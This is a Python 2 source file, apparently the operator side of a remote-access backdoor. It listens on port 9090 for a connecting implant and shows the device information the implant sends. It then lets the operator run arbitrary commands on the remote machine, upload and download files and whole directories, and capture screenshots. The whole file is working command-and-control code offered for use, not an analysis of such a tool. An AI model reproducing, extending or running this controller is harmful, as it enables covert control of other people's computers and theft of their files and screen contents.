from __future__ import print_function
from time import sleep
from socket import socket, error
from shutil import make_archive
from os import remove


# Function used for adding header to data which tells
# that what is length of comming data
# format == [length of data under 10] + encrpted command
# It means you can send 9999999999 bytes or 9.9 GB of data
# For large data you can change size in my case it is 10
# If you change size then don't forget to change this size in server side script
# And also don't forget to change in "recvall()" function
def add_header(data):
    data = "{:<10}".format(len(data)) + data
    return data


# Function used for receiving all comming data using header
# Please set data_part receiving bytes upto 10 bytes
# so header can completely receive in my case it is "1024" bytes
def recvall(conn):
    new_data = True
    data = ""
    while True:
        data_part = conn.recv(1024)
        if new_data:
            data_len = int(data_part[:10])
            data_part = data_part[10:]
            new_data = False
        data += data_part
        if len(data) == data_len:
            break
    return data


# Just for printing
def input_check():
    print("Check your input")


# This is main funcion used for listening, sending and displaying received data
def connection():
    x = 0
    s = socket()
    host = ""
    port = 9090
    s.bind((host, port))
    s.listen(5)
    print("Listening ......")
    conn, address = s.accept()
    print("Connected with " + str(address))
    ###################################
    # For receiving some information about devise
    response = recvall(conn)
    print(response, end="")
    ####################################
    while True:
        cmd = (raw_input(">"))
        if cmd[:9] == "uploaddir":
            dir_name = cmd[11:].split(",,")
            if len(dir_name) == 2:
                try:
                    print("Making archive of directory " + dir_name[0])
                    archive = make_archive(dir_name[0], 'zip', dir_name[0])
                    data = open(archive, "rb").read()
                    remove(archive)
                    print("Sending")
                    file_data = (cmd[:9] + dir_name[1] + "||=shail=||" + data)
                    file_data = add_header(file_data)
                    conn.send(file_data)
                    print("File sended and wating for response ...")
                    response = recvall(conn)
                    print(response, end="")
                except (IOError, WindowsError):
                    print("Not Any File Found in server")
            else:
                input_check()
        elif cmd[:6] == "upload":
            file = cmd[8:].split(",,")
            if len(file) == 2:
                try:
                    print("Reading file " + file[0])
                    with open(file[0], "rb") as f:
                        data = f.read()
                    print("Reading file complete")
                    file_data = (cmd[:6] + file[1] + "||=shail=||" + data)
                    print("sending")
                    file_data = add_header(file_data)
                    conn.send(file_data)
                    print("File sended and wating for response ...")
                    response = recvall(conn)
                    print(response, end="")
                except IOError:
                    print("Not Any File Found in server")
            else:
                input_check()
        elif cmd[:11] == "downloaddir":
            dir_name = cmd[13:].split(",,")
            if len(dir_name) == 2:
                file_data = add_header(cmd[:11] + dir_name[0])
                conn.send(file_data)
                print("Request sended ...")
                data = recvall(conn)
                data = data.split("||=shail=||")
                if data[0] == "not found":
                    print("Not Any File Found ...")
                else:
                    try:
                        open((dir_name[1] + "_downloaded.zip"), "wb").write(data[0])
                        print("Directory has been received")
                    except IOError:
                        print("No such file or directory in server")
                print(data[1], end="")
            else:
                input_check()
        elif cmd[:8] == "download":
            file = cmd[10:].split(",,")
            if len(file) == 2:
                file_data = (cmd[:8] + file[0])
                file_data = add_header(file_data)
                conn.send(file_data)
                data = recvall(conn)
                data = data.split("||=shail=||")
                if data[0] == "not found":
                    print("Not Any File Found ...")
                else:
                    try:
                        with open(file[1], "wb") as f:
                            f.write(data[0])
                            print("File Has Been Received")
                    except IOError:
                        print("No such file or directory ...")
                print(data[1], end="")
            else:
                input_check()
        elif cmd[:10] == "screenshot":
            cmd = cmd.split(",,")
            if len(cmd) == 2:
                cmd, shot_path = cmd
                shot_path = shot_path + ".png"
                cmd = add_header(cmd)
                conn.send(cmd)
                response = recvall(conn)
                response = response
                shot, cwd = response.split("||=shail=||")
                with open(shot_path, "wb") as f:
                    f.write(shot)
                    x += 1
                print("Screenshot Saved In " + shot_path)
                print(cwd, end="")
            else:
                input_check()
        elif len(cmd) > 0:
            cmd = add_header(cmd)
            conn.send(cmd)
            response = recvall(conn)
            print(response, end="")


# This is used to start listening for conections again and again if any error occured
while True:
    try:
        connection()
    except error as msg:
        sleep(1)
        print(msg)
        print("Retrying ...")
